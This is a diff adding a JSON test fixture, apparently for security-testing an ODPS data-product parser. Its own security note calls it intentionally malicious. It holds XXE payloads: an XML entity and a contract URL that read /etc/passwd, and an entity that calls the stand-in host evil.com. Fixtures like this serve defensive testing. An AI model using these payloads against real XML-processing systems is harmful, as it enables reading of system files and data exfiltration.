@@ -1,0 +1,22 @@
+{
+  "schema": "https://opendataproducts.org/schema/v4.1",
+  "version": "4.1",
+  "product": {
+    "details": {
+      "en": {
+        "productID": "malicious-xxe",
+        "name": "XXE Attack Attempt",
+        "description": "This file contains an XXE (XML External Entity) attack attempt. While ODPS is JSON, this attempts to embed XML-like structures that could trigger XXE if processed incorrectly."
+      }
+    },
+    "contract": {
+      "contractURL": "file:///etc/passwd"
+    },
+    "dataQuality": {
+      "xmlContent": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "xmlEntity": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/steal\">]><foo>&xxe;</foo>"
+    }
+  },
+  "_security_note": "This file is intentionally malicious for security testing. It contains XXE attack patterns that could be exploited if XML processing is used."
+}
+
